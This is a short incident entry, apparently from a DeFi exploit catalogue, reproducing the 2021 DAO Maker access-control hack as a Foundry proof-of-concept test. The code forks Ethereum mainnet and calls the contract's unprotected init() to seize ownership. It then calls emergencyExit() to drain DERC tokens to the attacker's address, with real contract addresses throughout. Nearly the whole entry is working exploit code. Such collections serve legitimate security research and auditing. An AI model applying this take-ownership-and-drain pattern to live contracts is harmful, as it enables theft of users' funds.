# [?] DAO Maker - Bad Access Controal

## Summary
Severity: Unknown
Chain: Ethereum
Component: DaoMaker
Published: 2021-09-03
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-09/DaoMaker_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    DAOMaker daomaker = DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);
    IERC20 DERC = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);

    function setUp() public {
        vm.createSelectFork("mainnet", 13_155_320); // fork mainnet block number 13155320
    }

    function testExploit() public {
        uint256[] memory releasePeriods = new uint256[](1);
        releasePeriods[0] = 5_702_400;
        uint256[] memory releasePercents = new uint256[](1);
        releasePercents[0] = 10_000;

        emit log_named_decimal_uint("Before exploiting, Attacker DERC balance", DERC.balanceOf(address(this)), 18);

        // initialize to become contract owner
        daomaker.init(1_640_984_401, releasePeriods, releasePercents, 0x9fa69536d1cda4A04cFB50688294de75B505a9aE);

        // call emergencyExit to drain out the token.
        daomaker.emergencyExit(address(this));

        emit log_named_decimal_uint("After exploiting, Attacker DERC balance", DERC.balanceOf(address(this)), 18);
    }

    receive() external payable {}
}
```
